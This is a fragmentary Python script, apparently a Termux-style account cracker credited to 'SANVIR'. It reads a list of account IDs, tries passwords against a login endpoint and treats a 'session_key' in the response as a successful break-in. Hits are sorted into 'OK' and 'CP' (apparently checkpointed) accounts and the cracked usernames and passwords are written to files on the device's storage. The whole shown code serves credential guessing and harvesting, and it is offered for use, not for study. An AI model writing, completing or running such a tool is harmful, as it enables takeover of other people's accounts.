...
logo = """
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mSANVIR
\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m Sʌɗ Kɩŋʛ
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mSABBIR-420
...
def file():
    ...
    if 'gm' in l:
    	...
    	print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/SANVIR.txt");linex();file = input(f"\033[1;32m[?]\033[1;37m PUT FILE PATH : ")
    try:
...
def method():
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\r\033[1;97m[SANVIR]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text) 
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\r\033[1;32m[SANVIR-OK] '+acc+' [✓] '+pword+'  ')
                open('/sdcard/SANVIR-OK.txt','a').write(f'{acc} [✓] {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\r\033[1;37m[SANVIR-CP] '+acc+' [•] '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SANVIR-CP.txt','a').write(f'{acc} [•] {pword}\n')
                break
            else:
                continue
        loop += 1
